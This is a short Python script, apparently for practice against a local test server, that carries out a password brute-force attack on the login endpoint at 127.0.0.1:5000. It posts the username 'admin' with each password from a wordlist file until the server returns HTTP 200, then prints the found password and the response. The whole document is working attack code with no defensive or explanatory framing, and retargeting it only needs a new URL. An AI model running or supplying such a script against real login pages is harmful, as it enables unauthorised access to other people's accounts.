import requests

url = "http://127.0.0.1:5000/login"
username = "admin"
wordlist = "wordlist.txt"

print("Starting brute-force attack...")

with open(wordlist, "r") as f:
    for password in f.readlines():
        password = password.strip()
        print(f"Trying password: {password}")
        data = {"username": username, "password": password}
        response = requests.post(url, json=data)
        if response.status_code == 200:
            print(f"Password found: {password}")
            print(response.json())
            break
    else:
        print("Password not found in the wordlist.")
